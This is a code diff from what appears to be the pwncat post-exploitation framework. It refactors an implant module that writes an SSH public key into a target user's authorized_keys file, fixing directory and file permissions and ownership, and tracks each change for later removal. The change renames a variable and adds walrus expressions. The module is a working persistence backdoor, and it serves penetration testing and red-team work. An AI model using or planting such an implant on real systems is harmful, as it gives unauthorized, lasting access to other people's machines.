@@ -79,7 +79,7 @@ class Module(ImplantModule):
     def install(self, session: "pwncat.manager.Session", user, key):
 
         # Keep track of all the tampers local to the module
-        T = []
+        tampers = []
 
         yield Status("verifying user permissions")
         current_user = session.current_user()
@@ -100,14 +100,13 @@ class Module(ImplantModule):
         except (FileNotFoundError, PermissionError) as exc:
             raise ModuleFailed(str(exc)) from exc
 
-        # Parse user name (default is current user)
-        if user == "__pwncat_current__":
-            user_info = current_user
-        else:
-            user_info = session.find_user(name=user)
-
         # Ensure the user exists
-        if user_info is None:
+        if not (
+            user_info := current_user
+            # Parse user name (default is current user)
+            if user == "__pwncat_current__"
+            else session.find_user(name=user)
+        ):
             raise ModuleFailed(f"user [blue]{user}[/blue] does not exist")
 
         # Ensure we haven't already installed for this user
@@ -122,13 +121,14 @@ class Module(ImplantModule):
         sshdir = session.platform.Path(user_info.home) / ".ssh"
         if not sshdir.is_dir():
             sshdir.mkdir(parents=True, exist_ok=True)
-            T.append(CreatedDirectory(self.name, user_info.id, str(sshdir)))
+            tampers.append(CreatedDirectory(self.name, user_info.id, str(sshdir)))
 
         yield Status("fixing .ssh directory permissions")
-        mode = sshdir.stat().st_mode & 0o777
-        if mode != 0o700:
+        if (mode := sshdir.stat().st_mode & 0o777) != 0o700:
             sshdir.chmod(0o700)
-            T.append(ModifiedPermissions(self.name, user_info.id, str(sshdir), mode))
+            tampers.append(
+                ModifiedPermissions(self.name, user_info.id, str(sshdir), mode)
+            )
 
         authkeys_path = sshdir / "authorized_keys"
         tamper = CreatedFile(self.name, user_info.id, str(authkeys_path))
@@ -153,7 +153,7 @@ class Module(ImplantModule):
             yield Status("patching authorized keys")
             with authkeys_path.open("w") as filp:
                 filp.writelines(authkeys)
-            T.append(tamper)
+            tampers.append(tamper)
         except (FileNotFoundError, PermissionError) as exc:
             raise ModuleFailed(str(exc)) from exc
 
@@ -162,15 +162,14 @@ class Module(ImplantModule):
         stat = authkeys_path.stat()
         uid, gid = stat.st_uid, stat.st_gid
         session.platform.chown(str(authkeys_path), user_info.id, user_info.gid)
-        T.append(
+        tampers.append(
             ModifiedOwnership(self.name, user_info.id, str(authkeys_path), uid, gid)
         )
 
-        mode = authkeys_path.stat().st_mode
-        if mode != 0o600:
-            T.append(
+        if (mode := authkeys_path.stat().st_mode) != 0o600:
+            tampers.append(
                 ModifiedPermissions(self.name, user_info.id, str(authkeys_path), mode)
             )
             authkeys_path.chmod(0o600)
 
-        return AuthorizedKeyImplant(self.name, user_info, key, pubkey, T)
+        return AuthorizedKeyImplant(self.name, user_info, key, pubkey, tampers)
